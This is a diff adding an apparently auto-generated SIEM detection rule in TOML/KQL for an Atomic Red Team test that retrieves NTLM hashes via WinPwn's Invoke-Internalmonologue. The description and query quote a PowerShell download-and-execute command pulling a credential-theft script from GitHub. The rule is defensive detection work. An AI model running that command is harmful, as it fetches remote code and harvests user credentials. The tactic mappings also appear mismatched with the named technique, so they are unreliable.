@@ -1,0 +1,39 @@
+[rule]
+author = [ "AtomicRedTeam-Automation",]
+description = "Detection for specific test 'WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS' (GUID: 7f06b25c-799e-40f1-89db-999c9cc84317) of technique T1187 (Forced Authentication). Test Description: PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS technique via function of WinPwn. Command/Steps: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Interna..."
+from = "now-9m"
+rule_id = "e830ff1e-945c-4e62-9838-ef2936dfd6f2"
+language = "kql"
+name = "Atomic Test: T1187 - WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS"
+output_index = ".siem-signals-default"
+references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1187/T1187.yaml",]
+risk_score = 50
+severity = "medium"
+tags = [ "AtomicRedTeam", "T1187", "7f06b25c-799e-40f1-89db-999c9cc84317", "windows",]
+type = "query"
+query = "(process.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\") OR process.parent.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\")) AND (powershell.script_block_text : \\\"*iex(new-object*\\\" AND powershell.script_block_text : \\\"*net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')*\\\" AND powershell.script_block_text : \\\"*Invoke-Internalmonologue*\\\" OR (process.command_line : \\\"*iex(new-object*\\\" AND process.command_line : \\\"*net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')*\\\" AND process.command_line : \\\"*Invoke-Internalmonologue*\\\"))"
+version = 1
+index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1187"
+name = "WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS"
+reference = "https://attack.mitre.org/techniques/T1187"
+
+[[rule.threat.tactic]]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/techniques/T1187"
+
+[[rule.threat.tactic]]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/techniques/T1187"
+
+[[rule.threat.tactic]]
+id = "TA0005"
+name = "Defense Evasion"
+reference = "https://attack.mitre.org/techniques/T1187"
+
+
